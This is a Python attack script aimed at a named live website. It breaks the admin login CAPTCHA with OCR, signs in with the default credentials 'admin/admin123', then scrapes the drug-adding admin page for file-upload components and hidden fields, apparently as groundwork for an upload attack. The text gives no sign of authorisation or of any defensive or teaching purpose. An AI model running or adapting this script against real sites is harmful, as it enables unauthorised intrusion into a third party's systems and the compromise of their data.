#!/usr/bin/env python3
"""fetch gz adddrugs page with admin session, analyze upload components"""
import urllib.request, urllib.parse, re, http.cookiejar

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=12, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

# 1. login
code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify", headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
import base64, subprocess, sys
b64 = base64.b64encode(cap).decode()
ocr_code = "import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); print(o.classification(base64.b64decode('%s')))" % b64
r = subprocess.run([sys.executable, "-c", ocr_code], capture_output=True, timeout=20, cwd="/tmp")
cap_text = r.stdout.decode().strip()
data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                          headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index", "X-Requested-With": "XMLHttpRequest"})
print("login:", resp.decode("utf-8", "ignore")[:100])

# 2. adddrugs page
code, final, body = fetch(HOST + "/index.php?m=admin&c=goods&a=adddrugs", headers={"Referer": HOST + "/index.php?m=admin&c=index&a=index"})
bt = body.decode("utf-8", "ignore")
print("adddrugs:", code, final, "size", len(bt))
open("/tmp/gz_adddrugs.html", "w").write(bt)
# upload components
print("=== UEditor refs ===")
for m in re.finditer(r'(ue\.|UEDITOR|ueditor|kindeditor|uploadify|webuploader|type="file")', bt, re.I):
    i = m.start()
    print(" ", bt[max(0,i-80):i+80].replace("\n", " ")[:160])
    break
print("=== file inputs ===")
for m in re.finditer(r'<input[^>]*type=["\']file["\'][^>]*>', bt, re.I):
    print(" ", m.group(0)[:150])
print("=== hidden upload fields ===")
for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*>', bt, re.I):
    print(" ", m.group(0)[:150])
